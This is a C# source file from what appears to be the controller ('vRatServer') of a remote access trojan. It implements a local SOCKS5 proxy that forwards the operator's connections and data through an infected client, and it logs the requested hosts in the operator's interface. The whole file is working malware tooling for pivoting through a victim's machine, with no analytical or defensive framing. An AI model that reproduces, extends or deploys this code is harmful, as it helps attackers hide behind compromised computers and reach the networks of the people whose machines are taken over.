using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace vRatServer.Classes
{
    class ProxyServer
    {
        Client client;
        List<Socket> Connections = new List<Socket>();
        private TcpListener _server;
        private bool _isRunning = true;
        public static ulong id = 0;
        public static List<socket_details> req = new List<socket_details>();
        public static Mutex m = new Mutex();
        RichTextBox rch;
        public ProxyServer(int port, RichTextBox rch, Client client)
        {
            _server = new TcpListener(IPAddress.Parse("127.0.0.1"), port);
            _server.Start();
            this.rch = rch;
            this.client = client;
        }

        public void Start()
        {
            Task.Run(() => Listen());
            MessageBox.Show("Socks5 proxy server started at : 127.0.0.1:1080","Started",MessageBoxButtons.OK,MessageBoxIcon.Information);
        }

        private void Listen()
        {
            while (_isRunning)
            {
                Socket client = _server.AcceptSocket();
                Connections.Add(client);
                new Thread(new ParameterizedThreadStart(HandleProxyClient)).Start(client);

            }
            MessageBox.Show("stop listen");
        }
        public void Stop()
        {
            _isRunning = false;
            _server.Stop();
            foreach(Socket s in Connections)
            {
                s.Close();
            }
        }

        private void readProxyData(socket_details sd, ref byte[] data)
        {
            int r = 0;
            int j = 0;

            while (true)
            {
                try
                {
                    r = sd.s.Receive(data);
                }
                catch (Exception e) { break; }
                j=globals.SendPacket(client, (byte)globals.PacketType.socksdata, r, sd.id, ref data);
                if (j != 0) {   _server.Stop(); break; }
                if (r <= 0) { break; }
                




            }

            


        }
        private void HandleProxyClient(object obj)
        {
            ulong _id = System.Threading.Volatile.Read(ref ProxyServer.id);
            System.Threading.Volatile.Write(ref ProxyServer.id, ProxyServer.id + 1);
            Socket proxyconnection = (Socket)obj;
            byte[] reply = { 0x05, 0x00 };
            byte[] data = new byte[5000000 + 100];
            int r = 0;
            try
            {
                r = proxyconnection.Receive(data);
                if (r <= 0)
                {
                    proxyconnection.Close();
                    return;
                }
                proxyconnection.Send(reply);

                r = proxyconnection.Receive(data);
                if (r <= 0)
                {
                    proxyconnection.Close();
                    return;
                }

                if (data[0] != 0x05 || (data[1] != 0x01 && data[1] != 0x03)) { return; }
                var sd = new socket_details(_id, proxyconnection);
                m.WaitOne();
                req.Add(sd);
                m.ReleaseMutex();


                int j = globals.SendPacket(client, (byte)globals.PacketType.socksconnect, r, _id, ref data);


                byte[] hostb = new byte[r -7];
                Array.Copy(data, 5, hostb, 0, hostb.Length);
                Program.f1.Invoke((MethodInvoker)delegate
                    {

                        if (!rch.IsDisposed)
                        {

                            rch.AppendText(Encoding.ASCII.GetString(hostb));
                            rch.AppendText("\n");

                        }
                    });
                    


                        if (j == 0)
                {
                    readProxyData(sd, ref data);
                }
            }
            catch (Exception e) { return; }

            return;
        }


    }
}
